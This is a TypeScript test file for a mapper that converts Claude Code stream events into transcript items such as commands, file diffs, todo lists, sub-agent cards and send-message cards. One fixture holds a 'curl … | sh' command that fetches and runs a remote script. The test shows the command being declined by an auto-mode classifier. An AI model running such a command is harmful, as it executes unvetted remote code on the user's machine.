import assert from "node:assert/strict";
import test from "node:test";
import {
  CLAUDE_TODO_ITEM_ID,
  ClaudeStreamMapper,
  fromClaudeThreadId,
  isClaudeThreadId,
  toClaudeThreadId,
  type ClaudeMapperOutput
} from "./claudeEvents";

function items(outputs: ClaudeMapperOutput[]) {
  return outputs.flatMap((output) => output.kind === "item" ? [output.item] : []);
}

test("thread ids carry the provider so Codex and Claude threads never mix", () => {
  const threadId = toClaudeThreadId("6f1c");
  assert.equal(threadId, "claude:6f1c");
  assert.equal(fromClaudeThreadId(threadId), "6f1c");
  assert.equal(isClaudeThreadId(threadId), true);
  assert.equal(fromClaudeThreadId("019f-codex-thread"), null);
  assert.equal(isClaudeThreadId(undefined), false);
});

test("subagent frames report deduplicated running usage per Agent call", () => {
  const mapper = new ClaudeStreamMapper();
  const frame = (agent: string, id: string, input: number, output: number, cacheRead = 0) => ({
    type: "assistant", parent_tool_use_id: agent,
    message: { id, content: [{ type: "text", text: "x" }],
      usage: { input_tokens: input, output_tokens: output, cache_read_input_tokens: cacheRead, cache_creation_input_tokens: 0 } }
  });
  const usage = (outputs: ClaudeMapperOutput[]) => outputs.flatMap((output) => output.kind === "subagent_usage" ? [output] : []);
  const first = usage(mapper.handle(frame("tu_a", "m1", 10, 2, 90)));
  assert.deepEqual(first, [{ kind: "subagent_usage", agentId: "tu_a", tokenUsage: {
    last: { inputTokens: 100, cachedInputTokens: 90, outputTokens: 2, totalTokens: 102 },
    total: { inputTokens: 100, cachedInputTokens: 90, outputTokens: 2, totalTokens: 102 } } }]);
  // A repeated frame of the same API message adds nothing.
  assert.deepEqual(mapper.handle(frame("tu_a", "m1", 10, 2, 90)), []);
  assert.deepEqual(usage(mapper.handle(frame("tu_a", "m2", 5, 3)))[0]?.tokenUsage.total,
    { inputTokens: 105, cachedInputTokens: 90, outputTokens: 5, totalTokens: 110 });
  assert.deepEqual(usage(mapper.handle(frame("tu_b", "m3", 7, 1)))[0]?.tokenUsage.total,
    { inputTokens: 7, cachedInputTokens: 0, outputTokens: 1, totalTokens: 8 });
  // Subagent text stays inside the Agent card.
  assert.deepEqual(items(mapper.handle(frame("tu_b", "m4", 1, 1))), []);
});

test("init announces the session once", () => {
  const mapper = new ClaudeStreamMapper();
  const init = { type: "system", subtype: "init", session_id: "s1", model: "claude-opus-5-5", permissionMode: "auto" };
  assert.deepEqual(mapper.handle(init), [{ kind: "session", sessionId: "s1", model: "claude-opus-5-5", permissionMode: "auto" }]);
  assert.deepEqual(mapper.handle(init), []);
});

test("auto-mode classifier denials render as declined with the reason", () => {
  const mapper = new ClaudeStreamMapper();
  mapper.handle({ type: "assistant", message: { id: "m4", content: [{ type: "tool_use", id: "tu_c", name: "Bash", input: { command: "curl -fsSL https://x.invalid/i.sh | sh" } }] } });
  assert.deepEqual(mapper.handle({ type: "system", subtype: "permission_denied", tool_name: "Bash", tool_use_id: "tu_c", decision_reason_type: "classifier" }), []);
  const reason = "Permission for this action was denied by the Claude Code auto mode classifier.";
  const done = items(mapper.handle({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "tu_c", content: reason, is_error: true }] } }));
  assert.equal(done[0]?.itemType, "command_execution");
  if (done[0]?.itemType === "command_execution") {
    assert.equal(done[0].status, "declined");
    assert.equal(done[0].aggregatedOutput, reason);
    assert.equal(done[0].exitCode, undefined);
  }
});

test("streamed text and the completed assistant message share one item id", () => {
  const mapper = new ClaudeStreamMapper();
  mapper.handle({ type: "stream_event", event: { type: "message_start", message: { id: "msg_1" } } });
  mapper.handle({ type: "stream_event", event: { type: "content_block_start", index: 0, content_block: { type: "thinking", thinking: "" } } });
  const thinking = items(mapper.handle({ type: "stream_event", event: { type: "content_block_delta", index: 0, delta: { type: "thinking_delta", thinking: "Check the file" } } }));
  assert.equal(thinking[0]?.itemType, "reasoning");
  mapper.handle({ type: "stream_event", event: { type: "content_block_start", index: 1, content_block: { type: "text", text: "" } } });
  mapper.handle({ type: "stream_event", event: { type: "content_block_delta", index: 1, delta: { type: "text_delta", text: "Hel" } } });
  const partial = items(mapper.handle({ type: "stream_event", event: { type: "content_block_delta", index: 1, delta: { type: "text_delta", text: "lo" } } }));
  assert.deepEqual(partial, [{ id: "msg_1:text:0", eventType: "item.updated", itemType: "agent_message", text: "Hello" }]);

  // Claude Code may split one API message into one SDK message per block.
  const completedThinking = items(mapper.handle({ type: "assistant", parent_tool_use_id: null, message: { id: "msg_1", content: [{ type: "thinking", thinking: "Check the file" }] } }));
  assert.equal(completedThinking[0]?.id, thinking[0]?.id);
  const completed = items(mapper.handle({ type: "assistant", parent_tool_use_id: null, message: { id: "msg_1", content: [{ type: "text", text: "Hello" }] } }));
  assert.deepEqual(completed, [{ id: "msg_1:text:0", eventType: "item.completed", itemType: "agent_message", text: "Hello" }]);
  assert.equal(mapper.lastAgentText, "Hello");
});

test("split SDK blocks classify progress for summaries and preserve the final answer", () => {
  const mapper = new ClaudeStreamMapper();
  mapper.handle({ type: "assistant", message: { id: "progress", content: [{ type: "text", text: "Checking the runner and mapper." }] } });
  const progress = items(mapper.handle({ type: "assistant", message: { id: "progress", content: [{ type: "tool_use", id: "read", name: "Read", input: { file_path: "/repo/a.ts" } }] } }));
  const comment = progress[0];
  assert.equal(comment?.itemType, "agent_message");
  if (comment?.itemType === "agent_message") {
    assert.equal(comment.id, "progress:text:0");
    assert.equal(comment.phase, "commentary");
    assert.equal(comment.comment?.detail, "Checking the runner and mapper.");
  }
  mapper.handle({ type: "assistant", message: { id: "answer", content: [{ type: "text", text: "Fixed and verified." }] } });
  const final = items(mapper.handle({ type: "result", subtype: "success", result: "Fixed and verified." }));
  assert.deepEqual(final, [{ id: "answer:text:0", eventType: "item.completed", itemType: "agent_message", text: "Fixed and verified.", phase: "final_answer" }]);
  assert.deepEqual(items(mapper.handle({ type: "result", subtype: "success" })), []);
});

test("Bash tool use and result become a command execution", () => {
  const mapper = new ClaudeStreamMapper();
  const started = items(mapper.handle({ type: "assistant", message: { id: "m2", content: [{ type: "tool_use", id: "tu_1", name: "Bash", input: { command: "npm test", description: "Run tests" } }] } }));
  assert.deepEqual(started, [{ id: "tu_1", eventType: "item.started", itemType: "command_execution", command: "npm test", aggregatedOutput: "", status: "inProgress" }]);
  const done = items(mapper.handle({ type: "user", message: { role: "user", content: [{ type: "tool_result", tool_use_id: "tu_1", content: "2 passing", is_error: false }] } }));
  assert.equal(done[0]?.itemType, "command_execution");
  assert.equal(done[0]?.eventType, "item.completed");
  if (done[0]?.itemType === "command_execution") {
    assert.equal(done[0].aggregatedOutput, "2 passing");
    assert.equal(done[0].exitCode, 0);
    assert.equal(done[0].status, "completed");
  }
});

test("declined tools render as declined", () => {
  const mapper = new ClaudeStreamMapper();
  mapper.handle({ type: "assistant", message: { id: "m3", content: [{ type: "tool_use", id: "tu_2", name: "Bash", input: { command: "rm -rf build" } }] } });
  mapper.markDeclined("tu_2");
  const done = items(mapper.handle({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "tu_2", content: "The user declined", is_error: true }] } }));
  assert.equal(done[0]?.itemType === "command_execution" && done[0].status, "declined");
});

test("Edit uses the original file from tool_use_result for a full-file diff", () => {
  const mapper = new ClaudeStreamMapper();
  const started = items(mapper.handle({ type: "assistant", message: { id: "m4", content: [{ type: "tool_use", id: "tu_3", name: "Edit", input: { file_path: "/repo/a.ts", old_string: "const a = 1;", new_string: "const a = 2;" } }] } }));
  assert.deepEqual(started[0]?.itemType === "file_change" && started[0].changes, [{ path: "/repo/a.ts", kind: "update", before: "const a = 1;", after: "const a = 2;" }]);
  const done = items(mapper.handle({
    type: "user",
    message: { content: [{ type: "tool_result", tool_use_id: "tu_3", content: "ok" }] },
    tool_use_result: { filePath: "/repo/a.ts", originalFile: "// head\nconst a = 1;\n" }
  }));
  assert.deepEqual(done[0]?.itemType === "file_change" && done[0].changes, [{ path: "/repo/a.ts", kind: "update", before: "// head\nconst a = 1;\n", after: "// head\nconst a = 2;\n" }]);
  assert.equal(done[0]?.itemType === "file_change" && done[0].status, "completed");
});

test("Write of a new file is an add", () => {
  const mapper = new ClaudeStreamMapper();
  mapper.handle({ type: "assistant", message: { id: "m5", content: [{ type: "tool_use", id: "tu_4", name: "Write", input: { file_path: "/repo/new.md", content: "# New" } }] } });
  const done = items(mapper.handle({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "tu_4", content: "created" }] }, tool_use_result: { type: "create", filePath: "/repo/new.md" } }));
  assert.deepEqual(done[0]?.itemType === "file_change" && done[0].changes, [{ path: "/repo/new.md", kind: "add", after: "# New" }]);
});

test("TodoWrite maps to the shared todo list item", () => {
  const mapper = new ClaudeStreamMapper();
  const result = items(mapper.handle({ type: "assistant", message: { id: "m6", content: [{ type: "tool_use", id: "tu_5", name: "TodoWrite", input: { todos: [
    { content: "Read runner", status: "completed", activeForm: "Reading runner" },
    { content: "Write mapper", status: "in_progress", activeForm: "Writing mapper" },
    { content: "Test", status: "pending", activeForm: "Testing" }
  ] } }] } }));
  assert.deepEqual(result, [{ id: CLAUDE_TODO_ITEM_ID, eventType: "item.completed", itemType: "todo_list", items: [
    { text: "Read runner", completed: true, status: "completed" },
    { text: "Write mapper", completed: false, status: "in_progress" },
    { text: "Test", completed: false, status: "pending" }
  ] }]);
});

test("subagent internals are hidden behind the Agent card", () => {
  const mapper = new ClaudeStreamMapper();
  const started = items(mapper.handle({ type: "assistant", message: { id: "m7", content: [{ type: "tool_use", id: "tu_6", name: "Agent", input: { description: "Search code", prompt: "Find X", model: "haiku", effort: "low", subagent_type: "Explore" } }] } }));
  assert.equal(started[0]?.itemType, "subagent");
  assert.equal(started[0]?.itemType === "subagent" && started[0].prompt, "Find X");
  assert.equal(started[0]?.itemType === "subagent" && started[0].model, "haiku");
  assert.equal(started[0]?.itemType === "subagent" && started[0].reasoningEffort, "low");
  const inner = mapper.handle({ type: "assistant", parent_tool_use_id: "tu_6", message: { id: "sub", content: [{ type: "text", text: "inner" }] } });
  assert.deepEqual(items(inner), []);
  assert.deepEqual(inner.map((output) => output.kind), ["subagent_activity"]);
  const done = items(mapper.handle({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "tu_6", content: [{ type: "text", text: "Found X in a.ts" }] }] } }));
  assert.equal(done[0]?.itemType === "subagent" && done[0].agents[0]?.message, "Found X in a.ts");
  assert.equal(done[0]?.itemType === "subagent" && done[0].prompt, "Find X");
  assert.equal(done[0]?.itemType === "subagent" && done[0].model, "haiku");
  assert.equal(done[0]?.itemType === "subagent" && done[0].reasoningEffort, "low");
  assert.equal(mapper.lastAgentText, "");
});

test("actor sub-agent cards carry their system-fixed model and effort, then the model the child really runs on", () => {
  const actorPrompt = "You are domain actor 輸入操作與介面體驗 (threadex-composer-ui), root threadex-composer-ui, a root actor.";
  const mapper = new ClaudeStreamMapper({ actor_ui_123456: { model: "claude-opus-5-5", effort: "medium", prompt: actorPrompt } });
  // The host passes no model or effort: the runner strips them and the agent definition applies.
  const started = items(mapper.handle({ type: "assistant", message: { id: "m9", content: [{ type: "tool_use", id: "tu_9", name: "Agent",
    input: { description: "Group chat UI", prompt: "Coordination notes", subagent_type: "actor_ui_123456" } }] } }));
  assert.equal(started[0]?.itemType === "subagent" && started[0].model, undefined);
  assert.equal(started[0]?.itemType === "subagent" && started[0].actualModel, "claude-opus-5-5");
  assert.equal(started[0]?.itemType === "subagent" && started[0].actualReasoningEffort, "medium");
  const usage = { input_tokens: 10, output_tokens: 2 };
  // Same model as the definition: no extra card update, only usage.
  assert.deepEqual(mapper.handle({ type: "assistant", parent_tool_use_id: "tu_9", message: { id: "c1", model: "claude-opus-5-5", usage, content: [] } })
    .map((output) => output.kind), ["subagent_usage"]);
  // A different model reported by the child's own response wins, keeping the fixed effort.
  const updated = items(mapper.handle({ type: "assistant", parent_tool_use_id: "tu_9", message: { id: "c2", model: "claude-sonnet-5-5", usage, content: [] } }));
  assert.equal(updated[0]?.eventType, "item.updated");
  assert.equal(updated[0]?.itemType === "subagent" && updated[0].actualModel, "claude-sonnet-5-5");
  assert.equal(updated[0]?.itemType === "subagent" && updated[0].actualReasoningEffort, "medium");
  const done = items(mapper.handle({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "tu_9", content: "UI done" }] } }));
  assert.equal(done[0]?.itemType === "subagent" && done[0].actualModel, "claude-sonnet-5-5");
  for (const item of [started[0], updated[0], done[0]]) {
    assert.equal(item?.itemType === "subagent" && item.actorContext, actorPrompt, "every card event carries the child's actor context");
  }
});

test("ordinary sub-agents record the model observed in their responses, ignoring synthetic messages", () => {
  const mapper = new ClaudeStreamMapper();
  items(mapper.handle({ type: "assistant", message: { id: "m10", content: [{ type: "tool_use", id: "tu_10", name: "Agent", input: { description: "Scan", prompt: "Scan", subagent_type: "general-purpose" } }] } }));
  assert.deepEqual(items(mapper.handle({ type: "assistant", parent_tool_use_id: "tu_10", message: { id: "s0", model: "<synthetic>", content: [] } })), []);
  const updated = items(mapper.handle({ type: "assistant", parent_tool_use_id: "tu_10", message: { id: "s1", model: "claude-haiku-5-5", content: [] } }));
  assert.equal(updated[0]?.itemType === "subagent" && updated[0].actualModel, "claude-haiku-5-5");
  assert.equal(updated[0]?.itemType === "subagent" && updated[0].actualReasoningEffort, undefined, "an effort the runner never learns stays unset");
  assert.equal(updated[0]?.itemType === "subagent" && updated[0].actorContext, undefined, "ordinary sub-agents have no actor context");
});

test("AskUserQuestion and ExitPlanMode produce no transcript item", () => {
  const mapper = new ClaudeStreamMapper();
  assert.deepEqual(mapper.handle({ type: "assistant", message: { id: "m8", content: [{ type: "tool_use", id: "tu_7", name: "AskUserQuestion", input: { questions: [] } }] } }), []);
  assert.deepEqual(mapper.handle({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "tu_7", content: "answered" }] } }), []);
});

test("result carries usage, cost and errors", () => {
  const mapper = new ClaudeStreamMapper();
  const [success] = mapper.handle({ type: "result", subtype: "success", is_error: false, result: "Done.", session_id: "s1", total_cost_usd: 0.12, usage: { input_tokens: 10, output_tokens: 20, cache_read_input_tokens: 5 } });
  assert.equal(success?.kind, "result");
  if (success?.kind === "result") {
    assert.equal(success.ok, true);
    assert.deepEqual(success.usage, { inputTokens: 10, outputTokens: 20, cacheReadInputTokens: 5, cacheCreationInputTokens: 0 });
    assert.equal(success.costUsd, 0.12);
  }
  assert.equal(mapper.lastAgentText, "Done.");
  const [failure] = mapper.handle({ type: "result", subtype: "error_during_execution", is_error: true });
  assert.equal(failure?.kind === "result" && failure.ok, false);
  assert.deepEqual(failure?.kind === "result" && failure.errors, ["Claude turn ended with error_during_execution."]);
});

test("assistant API errors and rate limit events surface", () => {
  const mapper = new ClaudeStreamMapper();
  assert.deepEqual(mapper.handle({ type: "assistant", error: "rate_limit", message: { id: "m9", content: [{ type: "text", text: "Limit reached" }] } }),
    [{ kind: "api_error", error: "rate_limit", text: "Limit reached" }]);
  const [limit] = mapper.handle({ type: "rate_limit_event", rate_limit_info: { status: "rejected", resetsAt: 1_800_000_000 } });
  assert.equal(limit?.kind === "rate_limit" && limit.status, "rejected");
  assert.equal(limit?.kind === "rate_limit" && limit.resetsAt, new Date(1_800_000_000_000).toISOString());
});

test("compaction boundary becomes a context compaction item", () => {
  const mapper = new ClaudeStreamMapper();
  const result = items(mapper.handle({ type: "system", subtype: "compact_boundary", uuid: "u1", compact_metadata: { trigger: "auto", pre_tokens: 150000 } }));
  assert.deepEqual(result, [{ id: "compact:u1", eventType: "item.completed", itemType: "context_compaction", beforeTokens: 150000 }]);
});

function activities(outputs: ClaudeMapperOutput[]) {
  return outputs.flatMap((output) => output.kind === "subagent_activity" ? [output.payload] : []);
}

function launchAgent(mapper: ClaudeStreamMapper, id = "toolu_agent") {
  mapper.handle({ type: "assistant", message: { id: "m1", content: [{ type: "tool_use", id, name: "Agent", input: { description: "work", subagent_type: "general-purpose", prompt: "go" } }] } });
}

test("subagent frames become bounded, deduplicated activity keyed by the Agent tool_use id", () => {
  const mapper = new ClaudeStreamMapper();
  launchAgent(mapper);
  const frame = { type: "assistant", parent_tool_use_id: "toolu_agent", message: { id: "c1", content: [{ type: "text", text: "x".repeat(5000) }, { type: "tool_use", id: "t1", name: "Read", input: {} }] } };
  const first = activities(mapper.handle(frame));
  assert.deepEqual(first.map((entry) => [entry.kind, entry.agentId, entry.seq]), [["message", "toolu_agent", 1], ["tool", "toolu_agent", 2]]);
  assert.equal(first[0]?.text?.length, 2000);
  assert.equal(first[1]?.toolName, "Read");
  // The CLI repeats earlier blocks in later frames of the same response.
  assert.deepEqual(activities(mapper.handle(frame)), []);
  // Child frames never leak into the main thread as items.
  assert.deepEqual(items(mapper.handle(frame)), []);
});

test("task progress is throttled and a task notification closes the card for good", () => {
  let now = 1_000_000;
  const mapper = new ClaudeStreamMapper();
  mapper.now = () => now;
  launchAgent(mapper);
  const started = activities(mapper.handle({ type: "system", subtype: "task_started", task_id: "a1", tool_use_id: "toolu_agent", description: "work", is_backgrounded: true }));
  assert.equal(started[0]?.kind, "started");
  assert.equal(started[0]?.taskId, "a1");
  const progress = (toolUses: number) => ({ type: "system", subtype: "task_progress", task_id: "a1", tool_use_id: "toolu_agent", description: "work", last_tool_name: "Bash", usage: { total_tokens: 10, tool_uses: toolUses, duration_ms: 1 } });
  now += 1000;
  assert.equal(activities(mapper.handle(progress(1))).length, 1);
  now += 1000;
  assert.equal(activities(mapper.handle(progress(2))).length, 0);
  now += 6000;
  assert.equal(activities(mapper.handle(progress(3)))[0]?.toolUses, 3);
  const done = mapper.handle({ type: "system", subtype: "task_notification", task_id: "a1", tool_use_id: "toolu_agent", status: "completed", summary: "ok" });
  assert.equal(activities(done)[0]?.kind, "finished");
  assert.equal(items(done)[0]?.eventType, "item.completed");
  // A late child frame must not reopen the finished card.
  const late = mapper.handle({ type: "assistant", parent_tool_use_id: "toolu_agent", message: { id: "c9", model: "other-model", content: [] } });
  assert.deepEqual(items(late), []);
  assert.deepEqual(activities(mapper.handle(progress(9))), []);
});

test("heartbeats cover quiet running agents, stop after the stall window and skip finished ones", () => {
  let now = 5_000_000;
  const mapper = new ClaudeStreamMapper();
  mapper.now = () => now;
  launchAgent(mapper);
  mapper.handle({ type: "assistant", parent_tool_use_id: "toolu_agent", message: { id: "c1", content: [{ type: "text", text: "hi" }] } });
  const beat = (waiting?: "approval" | "input") => activities(mapper.heartbeats({ quietMs: 30_000, stallMs: 120_000, processAlive: true, waiting }));
  now += 10_000;
  assert.deepEqual(beat(), []);
  now += 25_000;
  const [heartbeat] = beat();
  assert.equal(heartbeat?.kind, "heartbeat");
  assert.equal(heartbeat?.processAlive, true);
  assert.equal(heartbeat?.agentId, "toolu_agent");
  assert.ok((heartbeat?.elapsedMs ?? 0) >= 35_000);
  now += 30_000;
  const [waiting] = beat("approval");
  assert.equal(waiting?.kind, "waiting");
  assert.equal(waiting?.waiting, "approval");
  // No real activity for longer than the stall window: one last beat, then silence.
  let beats = 0;
  for (let index = 0; index < 20; index += 1) { now += 30_000; beats += beat().length; }
  assert.equal(beats <= 2, true);
  mapper.handle({ type: "system", subtype: "task_notification", task_id: "a1", tool_use_id: "toolu_agent", status: "failed", summary: "x" });
  now += 60_000;
  assert.deepEqual(beat(), []);
});

test("a foreground agent finishes with its tool_result but a background launch receipt does not", () => {
  const mapper = new ClaudeStreamMapper();
  launchAgent(mapper, "fg");
  launchAgent(mapper, "bg");
  const result = (id: string, text: string) => mapper.handle({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: id, content: text }] } });
  assert.deepEqual(activities(result("bg", "Async agent launched successfully")), []);
  assert.equal(activities(result("fg", "all done"))[0]?.kind, "finished");
  assert.equal(activities(mapper.heartbeats({ quietMs: 0, stallMs: 60_000, processAlive: true })).map((entry) => entry.agentId).join(), "bg");
});

function sendMessageUse(id: string, input: Record<string, unknown>, parent?: string) {
  return { type: "assistant", ...(parent ? { parent_tool_use_id: parent } : {}),
    message: { id: `m-${id}`, content: [{ type: "tool_use", id, name: "SendMessage", input }] } };
}

test("a main-session SendMessage becomes one send_message card addressed to the recipient's Agent card", () => {
  const mapper = new ClaudeStreamMapper();
  mapper.now = () => Date.parse("2026-10-28T00:00:00Z");
  launchAgent(mapper, "toolu_worker");
  mapper.handle({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "toolu_worker", content: "Async agent launched successfully.\nagentId: aa822c2fcdb3b1b3a" }] } });
  const use = sendMessageUse("toolu_send", { to: "aa822c2fcdb3b1b3a", summary: "Fix drift", message: "繼續修".repeat(4000) });
  const started = items(mapper.handle(use));
  assert.equal(started.length, 1);
  const card = started[0];
  assert.ok(card?.itemType === "subagent");
  assert.equal(card.tool, "send_message");
  assert.equal(card.status, "inProgress");
  assert.deepEqual(card.receiverThreadIds, ["toolu_worker"]);
  assert.equal(card.label, "Fix drift");
  assert.deepEqual(card.sendMessage && { ...card.sendMessage, message: card.sendMessage.message.length }, {
    toolUseId: "toolu_send", sender: { kind: "main" }, to: "aa822c2fcdb3b1b3a", recipientAgentId: "toolu_worker",
    summary: "Fix drift", message: 8000, messageTruncated: true, omittedMessageChars: 12000 - 7999,
    status: "pending", at: "2026-10-28T00:00:00.000Z"
  });
  assert.ok(card.sendMessage?.message.endsWith("…"));
  // Repeated assistant frames do not re-open the card.
  assert.deepEqual(items(mapper.handle(use)), []);
  const result = { type: "user", message: { content: [{ type: "tool_result", tool_use_id: "toolu_send",
    content: JSON.stringify({ success: true, message: "Resuming agent aa822c2", resumedAgentId: "aa822c2fcdb3b1b3a" }) }] } };
  const done = items(mapper.handle(result));
  assert.equal(done.length, 1);
  assert.ok(done[0]?.itemType === "subagent");
  assert.equal(done[0].status, "completed");
  assert.equal(done[0].sendMessage?.status, "sent");
  assert.match(done[0].sendMessage?.resultSummary ?? "", /Resuming agent/);
  assert.deepEqual(items(mapper.handle(result)), []);
});

test("a SendMessage to an unknown agent, a failed result and a declined call are reported as such", () => {
  const mapper = new ClaudeStreamMapper();
  mapper.handle(sendMessageUse("s1", { to: "old-agent", message: "hi" }));
  mapper.handle(sendMessageUse("s2", { to: "old-agent", message: "hi" }));
  mapper.handle(sendMessageUse("s3", { to: "old-agent", message: "hi" }));
  mapper.markDeclined("s3");
  const settle = (id: string, content: string, isError = false) => items(mapper.handle({ type: "user",
    message: { content: [{ type: "tool_result", tool_use_id: id, content, ...(isError ? { is_error: true } : {}) }] } }))[0];
  const failedJson = settle("s1", JSON.stringify({ success: false, message: "No agent named old-agent" }));
  assert.ok(failedJson?.itemType === "subagent");
  assert.deepEqual([failedJson.status, failedJson.sendMessage?.status, failedJson.receiverThreadIds, failedJson.sendMessage?.recipientAgentId],
    ["failed", "failed", [], undefined]);
  const errored = settle("s2", "boom", true);
  assert.ok(errored?.itemType === "subagent");
  assert.equal(errored.sendMessage?.status, "failed");
  const declined = settle("s3", "denied", true);
  assert.ok(declined?.itemType === "subagent");
  assert.deepEqual([declined.status, declined.sendMessage?.status], ["declined", "failed"]);
});

test("a sub-agent's SendMessage is one send_message activity on its own stream", () => {
  const mapper = new ClaudeStreamMapper();
  mapper.handle({ type: "assistant", message: { id: "m1", content: [{ type: "tool_use", id: "toolu_lead", name: "Agent",
    input: { description: "lead", subagent_type: "general-purpose", prompt: "go" } }, { type: "tool_use", id: "toolu_peer", name: "Agent",
    input: { description: "peer", subagent_type: "general-purpose", name: "peer", prompt: "go" } }] } });
  const use = sendMessageUse("toolu_child_send", { to: "peer", summary: "ping", message: "status?" }, "toolu_lead");
  const first = mapper.handle(use);
  assert.deepEqual(activities(first).map((entry) => [entry.kind, entry.toolName]), [["tool", "SendMessage"]]);
  assert.deepEqual(items(first), []);
  assert.deepEqual(mapper.handle(use), []);
  const result = { type: "user", parent_tool_use_id: "toolu_lead",
    message: { content: [{ type: "tool_result", tool_use_id: "toolu_child_send", content: "{\"success\":true}" }] } };
  const sent = activities(mapper.handle(result));
  assert.equal(sent.length, 1);
  assert.equal(sent[0]?.kind, "send_message");
  assert.equal(sent[0]?.agentId, "toolu_lead");
  assert.deepEqual(sent[0]?.sendMessage && [sent[0].sendMessage.sender, sent[0].sendMessage.recipientAgentId, sent[0].sendMessage.status],
    [{ kind: "subagent", agentId: "toolu_lead" }, "toolu_peer", "sent"]);
  assert.ok(sent[0]?.lastActivityAt && sent[0].at);
  assert.deepEqual(activities(mapper.handle(result)), []);
});

test("a sub-agent that ends before its SendMessage result still reports it once, as pending", () => {
  const mapper = new ClaudeStreamMapper();
  launchAgent(mapper, "fg");
  mapper.handle(sendMessageUse("child_send", { to: "*", message: "bye" }, "fg"));
  const ended = activities(mapper.handle({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "fg", content: "done" }] } }));
  assert.deepEqual(ended.map((entry) => [entry.kind, entry.sendMessage?.status]), [["send_message", "pending"], ["finished", undefined]]);
  assert.deepEqual(activities(mapper.handle({ type: "user", parent_tool_use_id: "fg",
    message: { content: [{ type: "tool_result", tool_use_id: "child_send", content: "late" }] } })), []);
});
